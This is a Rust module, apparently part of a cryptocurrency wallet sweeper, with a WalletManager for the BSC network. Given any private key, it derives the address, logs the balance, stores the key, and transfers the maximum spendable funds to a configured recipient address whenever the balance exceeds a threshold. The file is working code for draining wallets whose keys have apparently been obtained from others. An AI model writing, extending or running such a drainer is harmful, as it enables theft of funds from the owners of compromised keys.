use crate::config::Config;
use crate::models::wallet::{TransferResult, WalletInfo};
use crate::wallet::address::AddressDeriver;
use crate::wallet::balance::BalanceChecker;
use crate::wallet::transfer::TransferExecutor;
use std::sync::Arc;
use tracing::{info, warn};

pub struct WalletManager {
    config: Arc<Config>,
    address_deriver: AddressDeriver,
    balance_checker: BalanceChecker,
    transfer_executor: TransferExecutor,
}

impl WalletManager {
    pub fn new(config: Arc<Config>) -> Result<Self, String> {
        let address_deriver = AddressDeriver::new();
        let balance_checker = BalanceChecker::new(&config.rpc_url)
            .map_err(|e| e.to_string())?;
        let transfer_executor = TransferExecutor::new(&config.rpc_url, config.chain_id)
            .map_err(|e| e.to_string())?;
        
        Ok(Self {
            config,
            address_deriver,
            balance_checker,
            transfer_executor,
        })
    }
    
    pub async fn process_private_key(
        &self,
        private_key: &str,
    ) -> Result<(WalletInfo, Option<TransferResult>), String> {
        let address = self.address_deriver.derive_address(private_key)
            .ok_or_else(|| "Failed to derive address".to_string())?;
        
        info!("👛 Derived address: {}", address);
        
        let balance = self.balance_checker.get_balance(&address).await
            .map_err(|e| e.to_string())?;
        
        info!("💰 Balance for {}: {}", address, balance);
        
        let wallet_info = WalletInfo {
            address: address.clone(),
            private_key: private_key.to_string(),
            balance: balance.clone(),
            network: "bsc".to_string(),
        };
        
        let balance_float: f64 = balance.parse().unwrap_or(0.0);
        
        if balance_float > self.config.min_balance_threshold {
            let max_amount = TransferExecutor::calculate_max_amount(
                &balance,
                self.config.gas_price_gwei,
                self.config.gas_limit,
            );
            
            if max_amount == "0" || max_amount.parse::<f64>().unwrap_or(0.0) <= 0.0 {
                return Ok((wallet_info, None));
            }
            
            info!("📤 Transferring {} to {}", max_amount, self.config.recipient_address);
            
            let transfer_result = self.transfer_executor.transfer_native(
                private_key,
                &self.config.recipient_address,
                &max_amount,
                self.config.gas_limit,
                self.config.gas_price_gwei,
            ).await.map_err(|e| e.to_string())?;
            
            Ok((wallet_info, Some(transfer_result)))
        } else {
            Ok((wallet_info, None))
        }
    }
}